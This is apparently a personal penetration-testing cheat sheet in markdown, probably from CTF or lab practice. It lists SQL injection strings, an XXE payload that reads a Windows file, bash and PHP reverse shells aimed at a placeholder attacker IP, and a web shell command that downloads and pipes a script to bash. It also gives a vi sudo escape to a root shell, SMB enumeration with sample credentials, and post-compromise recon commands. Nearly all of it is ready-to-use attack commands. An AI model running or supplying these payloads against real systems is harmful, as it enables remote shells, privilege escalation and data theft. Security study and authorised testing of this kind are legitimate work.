---
Title: Penetration Test
description: 
spelling: 
---

## Flow

  VA -> PT

  1. Planning and Reconnaissance
  2. Scanning
  3. Gaining System Access
  4. Persistent Access
  5. Analysis and Reporting

## Injection

### SQL injection

``` shell
') or ( '1'='1
') or ( '1'=0
admin'||'1==1
1 or 1 = 1 UNION SELECT user
```

+ [SQL Injection Cheat Sheet | Invicti](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
+ [Auto_Wordlists/sqli.txt at main · carlospolop/Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt)

### XSLT Server Side Injection

example

``` xml
<?xml version = "1.0"?>
  <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
  <order>
    <quantity>1</quantity>
    <item>&test;</item>
    <address>address</address>
  </order>
```

### SSTI (Server Side Template injection)

Tools:

+ Java: [VikasVarshney/ssti-payload: SSTI Payload Generator](https://github.com/VikasVarshney/ssti-payload)
+ [[Day13] - SSTI - iT 邦幫忙](https://ithelp.ithome.com.tw/articles/10244403?sc=rss.iron)
+ [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

### reverse shell

bash

``` shell
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
```

php

``` php
<?php system('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [ip] [port] > /tmp/f; rm /tmp/f'); ?>
```

### Web shell

``` shell
Dysco.php?cmd=curl ${your_IP}:8000/shell.sh|bash
```

### Shell

``` shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### vi

``` shell
# is `sudo -l`
# User postgres may run the following commands on vaccine:
#     (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

# step 1
vi
:set shell=/bin/sh
:shell

# step 2
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
:set shell=/bin/sh
:shell
```

## SSH tunnel

```shell
# windows

# linux
lsof -i -n | egrep '\<ssh\>'
```

## 139,445 - Pentesting SMB

``` shell
# show smb file
smbmap -R -u "hazard" -p "stealth1agent" -H $ip 
# get user list 
# https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py
python lookupsid.py hazard:stealth1agent@10.10.10.149

```

## Program Language

+ [The Deadline: PHP 安全攻防 - Injection 系列(1)：OS Command Injection](https://w1a2d3s4q5e6.blogspot.com/2016/09/php-injection-1os-command-injection.html?m=1)

## What can you do when you hack into the server

See below

``` shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
export PATH="/tmp:$PATH"; echo $PATH;

whoami
sudo -l
ps aux
id
groups
cat /etc/passwd | grep -v "nologin\|false\|sync"
timeout 5s ...
ss -tul


sudo PATH="/tmp:$PATH" /usr/bin/whoami
```
